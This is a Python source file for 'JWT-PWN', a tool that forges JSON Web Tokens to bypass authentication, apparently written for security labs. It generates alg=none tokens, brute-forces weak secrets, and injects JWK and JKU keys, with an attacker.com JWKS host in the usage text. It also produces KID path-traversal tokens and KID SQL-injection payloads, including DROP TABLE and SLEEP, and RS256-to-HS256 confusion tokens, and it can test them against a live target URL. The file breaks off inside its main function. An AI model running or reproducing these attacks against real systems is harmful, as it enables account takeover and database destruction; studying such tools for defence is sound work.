#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║         JWT-PWN — Automated & Interactive JWT Tester             ║
║                                                                  ║
║  PATH1  → Attack 1  : No signature verification                  ║
║  PATH2  → Attack 2  : Algorithm = none (15+ variants)            ║
║  PATH3  → Attack 3  : Weak secret brute-force (wordlist)         ║
║  PATH4  → Attack 4  : JWK header injection                       ║
║  PATH5  → Attack 5  : JKU header injection                       ║
║  PATH6  → Attack 6  : KID path traversal → /dev/null             ║
║           Attack 7  : KID SQL injection                          ║
║  PATH7  → Attack 8a : Algorithm confusion (JWKS auto-discover)   ║
║           Attack 8b : Algorithm confusion (direct PEM/JWKS URL)  ║
║  PATH8  → Attack 9  : sig2n — derive key from 2 JWTs (Docker)   ║
╚══════════════════════════════════════════════════════════════════╝

Requirements:
    pip install cryptography
    docker   (optional — only needed for sig2n / PATH8)

Usage examples:
    # Run everything interactively (tool prompts for extras)
    python jwt_pwn.py <JWT> --claim sub --value administrator

    # Save output for Burp Intruder (one JWT per line)
    python jwt_pwn.py <JWT> --claim sub --value administrator -o tokens.txt --labeled

    # Brute-force HMAC secret (PATH3)
    python jwt_pwn.py <JWT> --claim sub --value administrator -w jwt.secrets.list

    # Algorithm confusion — auto-discover JWKS from target (PATH7)
    python jwt_pwn.py <JWT> --claim sub --value administrator --base-url https://target.com

    # Algorithm confusion — supply JWKS URL directly
    python jwt_pwn.py <JWT> --claim sub --value administrator --jwks-url https://target.com/jwks.json

    # Algorithm confusion — supply PEM file
    python jwt_pwn.py <JWT> --claim sub --value administrator --public-key server.pem

    # sig2n key derivation from two JWTs (PATH8)
    python jwt_pwn.py <JWT> --claim sub --value administrator --token2 <JWT2>

    # JKU injection — tool prints JWKS JSON to host, then asks for URL (PATH5)
    python jwt_pwn.py <JWT> --claim sub --value administrator --jku-url http://attacker.com/jwks.json

    # Test live — highlights HTTP 200 responses
    python jwt_pwn.py <JWT> --claim sub --value administrator -t https://target.com/admin
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request
from typing import List, Optional, Tuple

# ── Optional: cryptography (all RSA operations) ────────────────────────────────
try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


# ══════════════════════════════════════════════════════════════
# ANSI COLORS
# ══════════════════════════════════════════════════════════════
class C:
    RST  = '\033[0m'
    BOLD = '\033[1m'
    DIM  = '\033[2m'
    RED  = '\033[91m'
    GRN  = '\033[92m'
    YLW  = '\033[93m'
    BLU  = '\033[94m'
    CYN  = '\033[96m'
    WHT  = '\033[97m'

def col(text, *codes) -> str:
    return ''.join(codes) + str(text) + C.RST

def banner():
    print(col(r"""
          ___ _       __ ______       ____ _       __ _   __
         / / |     / //_  __/      / __ \ |     / // | / /
    __  / /| | /| / /  / / ______ / /_/ / | /| / //  |/ / 
   / /_/ / | |/ |/ /  / / /_____// ____/| |/ |/ // /|  /  
   \____/  |__/|__/  /_/        /_/     |__/|__//_/ |_/   
    """, C.CYN, C.BOLD))
    print(col("  Automated & Interactive JWT Vulnerability Testing Tool\n", C.DIM))
    print(col("  Developed By - Abhishek Gupta - linkedin.com/in/abhishek26gupta\n", C.DIM))
    if not CRYPTO_AVAILABLE:
        print(col("  [!] cryptography not installed — RSA attacks disabled", C.YLW))
        print(col("      pip install cryptography\n", C.DIM))


# ══════════════════════════════════════════════════════════════
# BASE64 / BASE64URL UTILITIES
# ══════════════════════════════════════════════════════════════
def b64url_decode(s: str) -> bytes:
    """Decode base64url string, padding-tolerant."""
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - len(s) % 4
    if pad != 4:
        s += '=' * pad
    return base64.b64decode(s)

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def pad_base64(s: str) -> str:
    """
    Add correct padding to a base64 or base64url string so decode won't fail.

    FIX: this helper was called throughout the JWKS key-parsing code but was
    never defined anywhere in the original script, causing a NameError crash
    the moment any JWKS URL was fetched.
    """
    s = s.replace('-', '+').replace('_', '/')   # normalise url-safe chars first
    pad = 4 - len(s) % 4
    return s if pad == 4 else s + '=' * pad

def _is_full_jwks_url(url: str) -> bool:
    """
    Return True when a URL already points to a specific JWKS endpoint.
    Used to decide: direct fetch vs probe common discovery paths.
    e.g.  https://target.com/.well-known/jwks.json → True  (full URL, fetch directly)
          https://target.com                        → False (base URL, probe endpoints)
    """
    u = url.lower().rstrip('/')
    full_paths = ('/jwks.json', '/jwks', '/api/keys', '/api/v1/keys',
                  '/openid-configuration', '/openid/connect/jwks.json')
    return any(u.endswith(p) for p in full_paths) or u.endswith('.json')


# ══════════════════════════════════════════════════════════════
# JWT CORE
# ══════════════════════════════════════════════════════════════
def parse_jwt(token: str) -> Tuple[dict, dict, str]:
    parts = token.strip().split('.')
    if len(parts) != 3:
        print(col(f"[!] Invalid JWT: expected 3 parts, got {len(parts)}", C.RED))
        sys.exit(1)
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]

def enc_header(h: dict) -> str:
    return b64url_encode(json.dumps(h, separators=(',', ':')).encode())

def enc_payload(p: dict) -> str:
    return b64url_encode(json.dumps(p, separators=(',', ':')).encode())

def build_jwt(header: dict, payload: dict, sig: str = '') -> str:
    return f"{enc_header(header)}.{enc_payload(payload)}.{sig}"

def sign_hmac(header: dict, payload: dict, secret: bytes, alg: str = 'HS256') -> str:
    digest_fn = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512,
    }.get(alg.upper(), hashlib.sha256)
    h = enc_header(header)
    p = enc_payload(payload)
    sig = hmac.new(secret, f"{h}.{p}".encode(), digest_fn).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

def verify_hmac(token: str, secret: bytes, alg: str = 'HS256') -> bool:
    try:
        parts = token.split('.')
        digest_fn = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512,
        }.get(alg.upper(), hashlib.sha256)
        expected = hmac.new(secret, f"{parts[0]}.{parts[1]}".encode(), digest_fn).digest()
        return b64url_encode(expected) == parts[2]
    except Exception:
        return False

def int_to_b64url(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return b64url_encode(n.to_bytes(length, 'big'))


# ══════════════════════════════════════════════════════════════
# RSA HELPERS  (require cryptography)
# ══════════════════════════════════════════════════════════════
def gen_rsa_keypair():
    priv = rsa.generate_private_key(65537, 2048, backend=default_backend())
    return priv, priv.public_key()

def sign_rs256(header: dict, payload: dict, private_key) -> str:
    h = enc_header(header)
    p = enc_payload(payload)
    raw_sig = private_key.sign(
        f"{h}.{p}".encode(), asym_padding.PKCS1v15(), hashes.SHA256()
    )
    return f"{h}.{p}.{b64url_encode(raw_sig)}"

def pubkey_to_jwk(pub, kid: str) -> dict:
    nums = pub.public_numbers()
    return {
        "kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
        "n": int_to_b64url(nums.n),
        "e": int_to_b64url(nums.e),
    }

def pubkey_from_pem_bytes(pem: bytes):
    return serialization.load_pem_public_key(pem, backend=default_backend())

def pubkey_to_pem_bytes(pub) -> bytes:
    return pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

def pubkey_to_der_bytes(pub) -> bytes:
    return pub.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

def jwk_dict_to_pubkey(jwk: dict):
    """
    Convert an RSA JWK dict (with n, e fields) to a cryptography public key object.
    pad_base64() handles missing padding before decode — this was the crash point.
    """
    n = int.from_bytes(base64.b64decode(pad_base64(jwk['n'])), 'big')
    e = int.from_bytes(base64.b64decode(pad_base64(jwk['e'])), 'big')
    return RSAPublicNumbers(e, n).public_key(default_backend())


# ══════════════════════════════════════════════════════════════
# JWKS FETCHING & AUTO-DISCOVERY  (pure urllib — no requests dep)
# ══════════════════════════════════════════════════════════════
# All endpoints from PATH7 / notes
JWKS_ENDPOINTS = [
    '/jwks.json',
    '/.well-known/jwks.json',
    '/openid/connect/jwks.json',
    '/api/keys',
    '/api/v1/keys',
    '/.well-known/openid-configuration',   # contains jwks_uri → follow it
]

def _fetch_json(url: str, timeout: int = 6) -> Optional[dict]:
    """
    Fetch a URL and JSON-parse the body. Pure urllib, no third-party deps.

    FIX: previously any SSL error (e.g. self-signed cert on non-standard port
    like mock.hackme.secops.group:9000) would silently return None, causing
    the algo confusion attack to fail with no useful error message.
    Now retries with SSL verification disabled on cert failures.
    """
    import ssl
    headers = {'User-Agent': 'Mozilla/5.0'}

    def _try(ctx=None):
        req = urllib.request.Request(url, headers=headers)
        kw = {'timeout': timeout}
        if ctx:
            kw['context'] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            return json.loads(r.read())

    try:
        return _try()
    except ssl.SSLError as e:
        # Common for pentest labs with self-signed certs — retry without verification
        print(col(f"    [!] SSL error ({e.reason}) — retrying without cert verification …", C.YLW))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode   = ssl.CERT_NONE
        try:
            return _try(ctx)
        except Exception as e2:
            print(col(f"    [!] Fetch failed (no-SSL): {e2}", C.RED))
            return None
    except urllib.error.HTTPError as e:
        print(col(f"    [!] HTTP {e.code} from {url}", C.YLW))
        return None
    except Exception as e:
        print(col(f"    [!] Fetch error: {e}", C.YLW))
        return None

def fetch_jwks_from_url(url: str) -> Optional[dict]:
    data = _fetch_json(url)
    return data if (data and 'keys' in data) else None

def discover_jwks(base_url: str) -> Optional[dict]:
    """
    Probe all common JWKS endpoints on base_url.
    Handles direct JWKS {"keys":[...]} and OpenID config {"jwks_uri":"..."}.
    """
    base = base_url.rstrip('/')
    for endpoint in JWKS_ENDPOINTS:
        url = base + endpoint
        data = _fetch_json(url)
        if not data:
            continue
        if 'jwks_uri' in data:
            jwks = _fetch_json(data['jwks_uri'])
            if jwks and 'keys' in jwks:
                print(col(f"    [+] JWKS via openid-config → {data['jwks_uri']}", C.GRN))
                return jwks
        if 'keys' in data:
            print(col(f"    [+] JWKS found at {url}", C.GRN))
            return data
    return None


# ══════════════════════════════════════════════════════════════
# ALGO-CONFUSION SIGNING VARIANTS  (shared by attacks 8a and 8b)
# ══════════════════════════════════════════════════════════════
def _all_confusion_variants(header: dict, payload: dict,
                             claim: str, value: str,
                             pub, source_lbl: str) -> List[Tuple[str, str, str]]:
    """
    Produce all HS256 signing variants for a given public key object.

    PATH7 says:
      "Copy PEM → Base64 encode it → use as 'k' value in JWT Editor symmetric key"
    In Burp JWT Editor, k = base64(PEM) and the library signs with base64_decode(k) = PEM bytes.
    So 'pem-raw' IS the correct PATH7 signing secret.

    'pem-b64' (FIX — was MISSING from original script) covers non-standard implementations
    that use the k-field value directly as the secret without base64-decoding it first.
    """
    results = []
    modified = {**payload, claim: value}
    mod_hdr  = {k: v for k, v in header.items() if k not in ('jwk', 'jku')}
    mod_hdr['alg'] = 'HS256'

    pem = pubkey_to_pem_bytes(pub)
    der = pubkey_to_der_bytes(pub)
    pem_b64_str = base64.b64encode(pem).decode()

    # Print key details for manual Burp steps
    print(col(f"\n    ┌─ Public Key  [{source_lbl}]", C.YLW))
    for line in pem.decode().strip().splitlines():
        print(col(f"    │ {line}", C.YLW))
    print(col(f"    ├─ base64(PEM) — paste as 'k' value in Burp JWT Editor symmetric key:", C.YLW))
    print(col(f"    │ {pem_b64_str}", C.CYN))
    print(col("    └─────────────────────────────────────────────────────────\n", C.YLW))

    variants = [
        (pem,                           "pem-raw",    "raw PEM bytes  ← PATH7 main (k decodes to PEM)"),
        (base64.b64encode(pem),         "pem-b64",    "base64(PEM)    ← k-string used as-is (was missing)"),
        (base64.urlsafe_b64encode(pem), "pem-b64url", "base64url(PEM) ← url-safe k-string as-is"),
        (der,                           "der-raw",    "raw DER bytes"),
        (base64.b64encode(der),         "der-b64",    "base64(DER)"),
    ]

    for secret_bytes, slug, desc in variants:
        results.append((
            f"algo-confusion:{source_lbl}:{slug}",
            f"RS256→HS256 [{source_lbl}], secret={desc}, {claim}={value!r}",
            sign_hmac(mod_hdr, modified, secret_bytes)
        ))
    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 1 — No Signature Verification  (PATH1)
# ══════════════════════════════════════════════════════════════
def attack_no_verify(header: dict, payload: dict,
                     claim: str, value: str, orig_sig: str) -> List[Tuple[str, str, str]]:
    modified = {**payload, claim: value}
    return [("no-verify",
             f"Original sig kept, {claim}={value!r}  ← PATH1: works if server skips verification",
             build_jwt(header, modified, orig_sig))]


# ══════════════════════════════════════════════════════════════
# ATTACK 2 — Algorithm = None  (PATH2)
# ══════════════════════════════════════════════════════════════
_NONE_VARIANTS = [
    "none", "None", "NONE", "nOne", "nONE", "NoNe", "nonE",
    "nOnE", "NOne", "NoNE", "NOnE", "NONe",
]
_NONE_ENCODED = [
    "%6e%6f%6e%65",   # url-encoded lowercase 'none'
    "%4e%6f%6e%65",   # url-encoded 'None'
    "n\u006fne",      # unicode escape mid-word
]

def attack_alg_none(header: dict, payload: dict,
                    claim: str, value: str) -> List[Tuple[str, str, str]]:
    results = []
    modified = {**payload, claim: value}
    seen: set = set()
    for variant in _NONE_VARIANTS + _NONE_ENCODED:
        if variant in seen:
            continue
        seen.add(variant)
        mod_hdr = {**header, 'alg': variant}
        jwt_dot = build_jwt(mod_hdr, modified, '')   # h.p.  PATH2 step 7: keep trailing dot
        results.append((f"alg-none:{variant}:trailing-dot",
                         f"alg={variant!r}, empty sig, trailing dot  ← PATH2",
                         jwt_dot))
        results.append((f"alg-none:{variant}:no-dot",
                         f"alg={variant!r}, empty sig, no trailing dot",
                         jwt_dot.rstrip('.')))
    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 3 — Weak Secret Brute-Force  (PATH3)
# ══════════════════════════════════════════════════════════════
def attack_weak_secret(token: str, header: dict, payload: dict,
                       claim: str, value: str,
                       wordlist_path: str) -> List[Tuple[str, str, str]]:
    results = []
    if not os.path.isfile(wordlist_path):
        print(col(f"  [!] Wordlist not found: {wordlist_path}", C.RED))
        return results

    orig_alg = header.get('alg', 'HS256').upper()
    if orig_alg not in ('HS256', 'HS384', 'HS512'):
        print(col(f"  [!] alg={orig_alg} is not HMAC-based — brute-force not applicable", C.YLW))
        return results

    print(col(f"  Cracking {orig_alg} from: {wordlist_path}", C.DIM))
    cracked = None
    count = 0
    start = time.time()

    with open(wordlist_path, 'r', errors='ignore') as f:
        for line in f:
            secret = line.rstrip('\n\r')
            count += 1
            if count % 20000 == 0:
                elapsed = time.time() - start or 0.001
                print(f"\r    {count:>10,} tried  |  {count/elapsed:>8,.0f}/s", end='', flush=True)
            if verify_hmac(token, secret.encode(), orig_alg):
                cracked = secret
                break

    print()

    if cracked:
        print(col(f"\n  [+] SECRET CRACKED: {cracked!r}", C.GRN, C.BOLD))
        # PATH3 Part 2: base64 encode the secret → paste as 'k' value in Burp JWT Editor
        cracked_b64 = base64.b64encode(cracked.encode()).decode()
        print(col(f"      base64(secret) for Burp JWT Editor 'k' field: {cracked_b64}", C.CYN))

        modified = {**payload, claim: value}
        for alg in ['HS256', 'HS384', 'HS512']:
            mod_hdr = {**header, 'alg': alg}
            results.append((
                f"weak-secret:{alg}",
                f"Secret={cracked!r}, re-signed as {alg}, {claim}={value!r}  ← PATH3",
                sign_hmac(mod_hdr, modified, cracked.encode(), alg)
            ))
    else:
        print(col(f"  [-] No match found in {count:,} words.", C.YLW))

    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 4 — JWK Header Injection  (PATH4)
# ══════════════════════════════════════════════════════════════
def attack_jwk_inject(header: dict, payload: dict,
                      claim: str, value: str) -> List[Tuple[str, str, str]]:
    if not CRYPTO_AVAILABLE:
        print(col("  [!] Skipped — pip install cryptography", C.YLW))
        return []
    priv, pub = gen_rsa_keypair()
    kid = "jwt-pwn-injected"
    jwk = pubkey_to_jwk(pub, kid)
    mod_hdr = {k: v for k, v in header.items() if k not in ('jku', 'x5u', 'x5c')}
    mod_hdr.update({'alg': 'RS256', 'kid': kid, 'jwk': jwk})
    modified = {**payload, claim: value}
    return [("jwk-inject",
             f"Self-signed JWK embedded in header, {claim}={value!r}  ← PATH4",
             sign_rs256(mod_hdr, modified, priv))]


# ══════════════════════════════════════════════════════════════
# ATTACK 5 — JKU Header Injection  (PATH5)
# ══════════════════════════════════════════════════════════════
def prepare_jku_keypair() -> Tuple[object, object, str, str]:
    """Generate RSA pair and JWKS JSON. Returns (priv, pub, kid, jwks_json)."""
    priv, pub = gen_rsa_keypair()
    kid = "jwt-pwn-jku"
    jwk = pubkey_to_jwk(pub, kid)
    jwks_json = json.dumps({"keys": [jwk]}, indent=2)
    return priv, pub, kid, jwks_json

def attack_jku_inject(header: dict, payload: dict, claim: str, value: str,
                      jku_url: str, priv, kid: str) -> List[Tuple[str, str, str]]:
    if not CRYPTO_AVAILABLE:
        print(col("  [!] Skipped — pip install cryptography", C.YLW))
        return []
    mod_hdr = {k: v for k, v in header.items() if k not in ('jwk', 'x5u', 'x5c')}
    mod_hdr.update({'alg': 'RS256', 'kid': kid, 'jku': jku_url})
    modified = {**payload, claim: value}
    return [("jku-inject",
             f"jku→{jku_url}, {claim}={value!r}  ← PATH5",
             sign_rs256(mod_hdr, modified, priv))]


# ══════════════════════════════════════════════════════════════
# ATTACK 6 — KID Path Traversal  (PATH6)
# ══════════════════════════════════════════════════════════════
_KID_PATHS = [
    "../../../../../../../dev/null",   # PATH6 exact depth
    "../../dev/null",
    "../../../dev/null",
    "../../../../dev/null",
    "../../../../../dev/null",
    "../../../../../../dev/null",
    "/dev/null",
    "../../proc/self/fd/0",
]

_EMPTY_SECRETS = [
    (b'',      'empty-string'),           # reading /dev/null = 0 bytes
    (b'\x00',  'null-byte [=AA== decoded]'),  # what JWT Editor actually signs with  ← PATH6
]

def attack_kid_traversal(header: dict, payload: dict,
                         claim: str, value: str) -> List[Tuple[str, str, str]]:
    results = []
    modified = {**payload, claim: value}
    for kid_path in _KID_PATHS:
        for secret, secret_lbl in _EMPTY_SECRETS:
            mod_hdr = {**header, 'alg': 'HS256', 'kid': kid_path}
            slug = kid_path.replace('/', '_').replace('.', '')
            results.append((
                f"kid-traversal:{slug}:{secret_lbl.split()[0]}",
                f"KID={kid_path!r}, secret={secret_lbl}, {claim}={value!r}  ← PATH6",
                sign_hmac(mod_hdr, modified, secret)
            ))
    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 7 — KID SQL Injection
# ══════════════════════════════════════════════════════════════
_SQLI_PAYLOADS = [
    ("key 1' UNION SELECT 'admin'--",                  "UNION-admin",       b"admin"),
    ("key 1' UNION SELECT 'secret'--",                 "UNION-secret",      b"secret"),
    ("x' UNION SELECT 'admin'-- -",                    "UNION-admin-mysql", b"admin"),
    ("1 UNION SELECT NULL,'admin',NULL--",             "UNION-3col",        b"admin"),
    ("x' OR '1'='1",                                   "OR-1eq1",           b"admin"),
    ("x' OR 1=1--",                                    "OR-1eq1-comment",   b"admin"),
    ("x'; DROP TABLE keys;--",                         "drop-table",        b""),
    ("1' AND SLEEP(5)--",                              "time-blind",        b"admin"),
    ("x' UNION SELECT secret FROM keys LIMIT 1--",     "dump-keys",         b"admin"),
]

def attack_kid_sqli(header: dict, payload: dict,
                    claim: str, value: str) -> List[Tuple[str, str, str]]:
    results = []
    modified = {**payload, claim: value}
    for kid_val, lbl, signing_secret in _SQLI_PAYLOADS:
        mod_hdr = {**header, 'alg': 'HS256', 'kid': kid_val}
        results.append((
            f"kid-sqli:{lbl}",
            f"SQLi kid={kid_val!r}, signed with {signing_secret!r}, {claim}={value!r}",
            sign_hmac(mod_hdr, modified, signing_secret)
        ))
    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 8a — Algorithm Confusion from JWKS  (PATH7 main)
# ══════════════════════════════════════════════════════════════
def attack_algo_confusion_from_jwks(header: dict, payload: dict,
                                     claim: str, value: str,
                                     jwks: dict) -> List[Tuple[str, str, str]]:
    if not CRYPTO_AVAILABLE:
        print(col("  [!] Skipped — pip install cryptography", C.YLW))
        return []
    results = []
    rsa_keys = [k for k in jwks.get('keys', []) if k.get('kty') == 'RSA']
    if not rsa_keys:
        print(col("  [!] No RSA keys found in JWKS", C.YLW))
        return []
    for i, jwk in enumerate(rsa_keys):
        kid = jwk.get('kid', f'key-{i}')
        try:
            pub = jwk_dict_to_pubkey(jwk)
            results += _all_confusion_variants(header, payload, claim, value, pub, f"jwks:{kid}")
        except Exception as e:
            print(col(f"  [!] Could not process JWKS key kid={kid!r}: {e}", C.YLW))
    return results


# ══════════════════════════════════════════════════════════════
# ATTACK 8b — Algorithm Confusion from PEM file
# ══════════════════════════════════════════════════════════════
def attack_algo_confusion_from_pem(header: dict, payload: dict,
                                    claim: str, value: str,
                                    pem_path: str) -> List[Tuple[str, str, str]]:
    if not CRYPTO_AVAILABLE:
        print(col("  [!] Skipped — pip install cryptography", C.YLW))
        return []
    try:
        with open(pem_path, 'rb') as f:
            pem = f.read()
        pub = pubkey_from_pem_bytes(pem)
        return _all_confusion_variants(header, payload, claim, value, pub, "pem-file")
    except Exception as e:
        print(col(f"  [!] Cannot load PEM: {e}", C.RED))
        return []


# ══════════════════════════════════════════════════════════════
# ATTACK 9 — sig2n: Derive Key from Two JWTs  (PATH8)
# ══════════════════════════════════════════════════════════════
def _parse_sig2n_output(output: str) -> List[Tuple[str, str]]:
    """
    Parse portswigger/sig2n Docker output.
    Returns list of (format_name, base64_key) pairs.

    sig2n output format (typical):
        X.509 Encoded Key:
        MIIBIjANBgk...
        Tampered JWT with X.509 key:
        eyJhbGci...

        PKCS1 Encoded Key:
        MIIBCgKC...
        Tampered JWT with PKCS1 key:
        eyJhbGci...
    """
    results = []
    lines   = output.splitlines()
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        fmt  = None
        line_lower = line.lower()

        if ('x.509' in line_lower or 'x509' in line_lower):
            if 'tampered' not in line_lower and 'jwt' not in line_lower:
                fmt = 'X.509'
        elif 'pkcs1' in line_lower:
            if 'tampered' not in line_lower and 'jwt' not in line_lower:
                fmt = 'PKCS1'

        if fmt:
            j = i + 1
            while j < len(lines) and not lines[j].strip():
                j += 1
            if j < len(lines):
                candidate = lines[j].strip()
                # Must be base64, not a JWT (JWTs start with eyJ)
                if candidate and not candidate.startswith('eyJ') and len(candidate) > 20:
                    results.append((fmt, candidate))
        i += 1
    return results

def attack_sig2n(header: dict, payload: dict,
                 claim: str, value: str,
                 token1: str, token2: str) -> List[Tuple[str, str, str]]:
    results = []

    try:
        subprocess.run(['docker', '--version'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(col("  [!] Docker not found — cannot run sig2n", C.YLW))
        print(col("  [!] Install Docker, then manually run:", C.DIM))
        print(col(f"      docker run --rm -it portswigger/sig2n {token1[:30]}... {token2[:30]}...", C.DIM))
        return []

    print(col("  [*] Running portswigger/sig2n (first run may pull image — ~2 min)…", C.DIM))
    try:
        proc = subprocess.run(
            ['docker', 'run', '--rm', 'portswigger/sig2n', token1, token2],
            capture_output=True, text=True, timeout=360
        )
        output = proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        print(col("  [!] sig2n timed out after 6 minutes", C.RED))
        return []
    except Exception as e:
        print(col(f"  [!] Docker error: {e}", C.RED))
        return []

    if not output.strip():
        print(col("  [!] sig2n produced no output", C.YLW))
        return []
    if 'not rsa signed' in output.lower() or 'not rsa' in output.lower():
        print(col(
            f"  [!] sig2n requires RS256/RS512-signed tokens.\n"
            f"      Your token uses alg={header.get('alg', '?')} — sig2n doesn't apply here.\n"
            f"      sig2n is only useful when the server uses RSA and you need to recover n.",
            C.YLW
        ))
        return []

    print(col(f"\n  ┌─ sig2n RAW OUTPUT ───────────────────────────────────────", C.YLW))
    for line in output.splitlines():
        print(col(f"  │ {line}", C.DIM))
    print(col("  └──────────────────────────────────────────────────────────\n", C.YLW))

    key_pairs = _parse_sig2n_output(output)
    if not key_pairs:
        print(col("  [!] Could not parse keys from sig2n output — check raw output above", C.YLW))
        return []

    modified = {**payload, claim: value}
    mod_hdr  = {k: v for k, v in header.items() if k not in ('jwk', 'jku')}
    mod_hdr['alg'] = 'HS256'

    print(col(f"  [+] {len(key_pairs)} candidate key(s) from sig2n:", C.GRN))
    for fmt, b64_key in key_pairs:
        print(col(f"    [{fmt}] {b64_key[:64]}…", C.CYN))

        # PATH8 Part 3: use base64_decode(key) as the 'k' value → HMAC secret
        try:
            try:
                secret_bytes = base64.b64decode(pad_base64(b64_key))
            except Exception:
                secret_bytes = base64.urlsafe_b64decode(pad_base64(b64_key))

            # Variant A: base64_decode(key) as secret — the PATH8 main method
            results.append((
                f"sig2n:{fmt}:decoded",
                f"sig2n {fmt} key, secret=base64_decode(key), {claim}={value!r}  ← PATH8",
                sign_hmac(mod_hdr, modified, secret_bytes)
            ))
            # Variant B: raw base64 string as bytes — covers edge-case implementations
            results.append((
                f"sig2n:{fmt}:raw-string",
                f"sig2n {fmt} key, secret=raw_b64_string, {claim}={value!r}",
                sign_hmac(mod_hdr, modified, b64_key.encode())
            ))
        except Exception as e:
            print(col(f"    [!] Could not sign with {fmt} key: {e}", C.YLW))

    print(col(
        "\n  [!] PATH8 Step 5: First test each sig2n JWT against /my-account "
        "(200 = correct key, 302 = wrong key).\n"
        "      Then use the matching key's JWT above for your /admin request.",
        C.YLW
    ))
    return results


# ══════════════════════════════════════════════════════════════
# HTTP TESTER
# ══════════════════════════════════════════════════════════════
def http_test(url: str, jwt_token: str,
              header_name: str = 'Authorization',
              bearer: bool = True) -> Tuple[int, int]:
    val = f"Bearer {jwt_token}" if (bearer and header_name.lower() == 'authorization') else jwt_token
    req = urllib.request.Request(url, headers={header_name: val})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, 0
    except Exception:
        return -1, 0


# ══════════════════════════════════════════════════════════════
# OUTPUT
# ══════════════════════════════════════════════════════════════
def print_results(results: List[Tuple[str, str, str]],
                  target_url: Optional[str] = None,
                  header_name: str = 'Authorization',
                  bearer: bool = True):
    if not results:
        print(col("\n[!] No JWTs generated.", C.RED))
        return

    width = 84
    print(col(f"\n{'─'*width}", C.DIM))
    print(col(f"  {len(results)} CANDIDATE JWTs GENERATED", C.BOLD, C.WHT))
    if target_url:
        print(col(f"  Testing against: {target_url}", C.DIM))
    print(col(f"{'─'*width}\n", C.DIM))

    for i, (attack, desc, jwt) in enumerate(results, 1):
        status_tag = ''
        if target_url:
            status, blen = http_test(target_url, jwt, header_name, bearer)
            if status == 200:
                status_tag = col(f"  ← HTTP {status} ✓ ({blen}b)", C.GRN, C.BOLD)
            elif status in (401, 403):
                status_tag = col(f"  ← HTTP {status}", C.RED)
            else:
                status_tag = col(f"  ← HTTP {status}", C.YLW)

        print(f"  {col(f'[{i:>3}]', C.BOLD)} {col(attack, C.CYN)}{status_tag}")
        print(f"        {col(desc, C.DIM)}")
        print(f"        {col(jwt, C.GRN)}\n")

    print(col('─' * width, C.DIM))

def save_results(results: List[Tuple[str, str, str]],
                 filepath: str, labeled: bool = False):
    with open(filepath, 'w') as f:
        for attack, desc, jwt in results:
            if labeled:
                f.write(f"# [{attack}] {desc}\n")
            f.write(jwt + '\n')
    print(col(f"\n[+] {len(results)} JWTs saved → {filepath}", C.GRN, C.BOLD))


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════
def main():
    banner()

    ap = argparse.ArgumentParser(
        description='JWT-PWN: Automated & Interactive JWT vulnerability testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    # Core
    ap.add_argument('jwt',             help='JWT to attack')
    ap.add_argument('--claim', '-c',   required=True, help='Claim to modify (e.g. sub, role)')
    ap.add_argument('--value', '-v',   required=True, help='New value for the claim')
    ap.add_argument('--output', '-o',  help='Save JWTs to file (one per line, for Burp Intruder)')
    ap.add_argument('--labeled', '-l', action='store_true',
                    help='Add # [attack] comment lines in output file')

    # Optional — tool prompts interactively when not supplied via CLI
    ap.add_argument('--wordlist', '-w',   help='Wordlist for HMAC brute-force (PATH3)')
    ap.add_argument('--jku-url',  '-ju',  help='URL to host your JWKS (PATH5)')
    ap.add_argument('--public-key', '-pk', help='Local PEM public key file (PATH7)')
    ap.add_argument('--jwks-url',          help='Direct JWKS URL (PATH7)')
    ap.add_argument('--base-url',          help='Target base URL for JWKS auto-discovery (PATH7)')
    ap.add_argument('--token2',            help='Second JWT for sig2n (PATH8)')

    # Live testing
    ap.add_argument('--target-url', '-t', help='Live URL to test JWTs against (GET, highlights 200)')
    ap.add_argument('--header',     default='Authorization',
                    help='HTTP header name (default: Authorization)')
    ap.add_argument('--no-bearer',  action='store_true',
                    help="Don't prepend 'Bearer ' in Authorization header")

    # Skip flags
    ap.add_argument('--skip-none',  action='store_true', help='Skip alg=none attacks')
    ap.add_argument('--skip-kid',   action='store_true', help='Skip KID path traversal')
    ap.add_argument('--skip-sqli',  action='store_true', help='Skip KID SQL injection')

    args   = ap.parse_args()
    bearer = not args.no_bearer

    # ── Parse ───────────────────────────────────────────────────
    print(col("[*] Parsing JWT …", C.BLU))
    header, payload, orig_sig = parse_jwt(args.jwt)
    print(col(f"    alg     : {header.get('alg', '?')}", C.DIM))
    print(col(f"    header  : {json.dumps(header)}", C.DIM))
